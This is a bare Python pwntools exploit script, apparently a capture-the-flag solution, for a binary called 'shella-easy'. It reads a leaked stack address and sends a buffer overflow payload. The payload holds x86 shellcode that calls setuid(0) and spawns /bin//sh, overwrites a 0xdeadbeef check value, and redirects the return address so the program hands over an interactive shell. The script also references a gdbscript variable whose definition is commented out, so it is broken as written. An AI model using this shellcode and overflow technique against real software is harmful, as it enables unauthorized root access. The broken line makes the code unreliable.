from pwn import *
import re

p = process('./shella-easy')

# gdbscript='''
# b *0x0804855a
# '''
gdb.attach(p, gdbscript=gdbscript)

print(p.recvuntil(b'a '))
leak = str(p.recvuntil(b' '))
address = int(leak.strip("b' '"), 16)
print(p.recvline())

payload = b''
payload += b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
payload += b'a'*(0x40-len(payload)) + p32(0xdeadbeef)
payload += b'a'*(0x4c-len(payload)) + p32(address)

# |----------(shell code)-----(0xdeadbeef)---------|return address|

# payload = b'abc'
print(payload)
p.sendline(payload)
p.interactive()
p.close()